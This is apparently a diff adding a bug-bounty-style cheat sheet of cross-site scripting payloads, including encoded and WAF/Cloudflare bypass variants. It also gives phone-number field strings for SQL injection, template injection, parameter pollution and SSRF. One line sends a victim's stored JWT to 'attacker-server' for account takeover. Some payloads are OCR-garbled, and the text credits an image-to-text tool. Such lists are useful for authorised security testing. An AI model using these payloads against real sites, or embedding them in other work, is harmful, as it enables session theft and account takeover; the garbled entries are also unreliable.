+<body/onload=alert(1)>
+<script/src=data:text/javascript,alert(1)>
+<b/onmouseover=alert(1)>
+<a/href='javascript:alert(1)'>
+asdf"onload="alert('Slax Was Here!')"asdf
+
+<script>a = "</script><img src=p onerror='prompt(1)'/>"
+As example 
+javascript:alert()
+//j%5c%5cjavascript%3aalert()
+//ja%5C%20javascript%0a:alert()
+
+java%0d%0ascript%0d%0a:alert(0)
+j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
+java%07script:prompt`0`
+java%09scrip%07t:prompt`0`
+jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
+pjavascriptt:confirm`0`
+<Svg Only=1 OnLoad=confirm(document.domain)>
+d1bvs%3c%2fscript%3e%3cscript%3ealert(`XSS`)%3c%2fscript%3ec579g
+asdf"onload%3d"alert('hello')"asdf
+<a href="data:text/html;charset=utf-7;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">Click Here</a>
+ r"><BODY%20ONLOAD=alert(1)>.
+ -confirm(document.domain)-‘(reflected xss)
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+ [alert][0].call(this,1)
+ asdf"onload%3d"alert('Slax Was Here!')"asdf
+
+ Blocked: <Svg/x=">"/OnLoAD=confirm()//
+
+\"><iframe/src=javascript:alert%26%23x000000028%3b)>
+Bypass: `%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F`
+
+document.location=”https://attacker-server?victim_jwt_token”+document.localStorage.getItem(“id_token”)(account takeover)
+-alert(origin)-
+
+
+(1) <xssBypass/onpointermove=(confirm)(1)>MoveMouseHere
+
+(2) <svg><script xlink:href="{ASCII}data: alert(1)"></script></svg> (3) <img sre=1 onerror="a:b:c:d:alert(1)">
+
+(4) <a/href="javascript®s0A%0D:alert()">
+
+(5) <svg onload=alert%26%230000000040"")>
+
+(6) <svg onx=() onload=(confirm)(1)>
+
+(7) %3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F (8) <object/data=javascript:alert()>
+
+(9) <svg onload=alert("")>
+
+(10) <loVonauxclick=[0].some(alert)>rightclickhere
+
+(11) <svG/x=">"/oNloaD=confirm()//
+Made with by imagetotext.io
+
+xss'''><iframe srcdoc='%26it;script>;prompt`
+${document.domain}`%26it;/script>'>(cloud flare bypass)
+/login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain --> xss pop-up
+
+"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail
+.com(email)
+
+<select><noembed></select><script x='a@b'a>
+y='a@b'//a@b%0a\u0061lert(1)</script x>
+
+xss'''><iframe srcdoc='%26it;script>;prompt`
+${document.domain}`%26it;/script>'>
+
+aa"id=YWxlcnQoMSk%3d oncontextmenu=x=atob;y=x(http://this.id);z=eval;z(y) aa=
+%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+To find XSS:
++9739343777;phone-context=<script>alert(1)</script>
+To find Parameter Pollution:
+
+1491 97x00xx7x7;phone-context=&phone-
+context=+9739343777
+
+2.491 97XXXX7XT;ext=1;ext=2
+
+To find Sql Injection:
+
++91 97x0007x7; phone-context=' OR 1=1; —
+
+To find Template Injection:
+
++91 97x0007x7; phone-context={{4*4}}{{5+5}}
+
+To find SSRF:
+
+491 97xxxx7x7:phone-context=burpcollaborator.net
+
+"><iframe src=//14.rs>
+<c/onpointerrawupdate=d=document,b=%27%60%27,d[%27loca%27%2B%27tion%27]=%27javascript%26colon;aler%27%2B%27t%27%2Bb%2Bdomain%2Bb>~tarun~Tochme
+["');alert('XSS');//"]@xyz.xxx
+);alert( 'CYBERTIX )5//" l@bug.xss
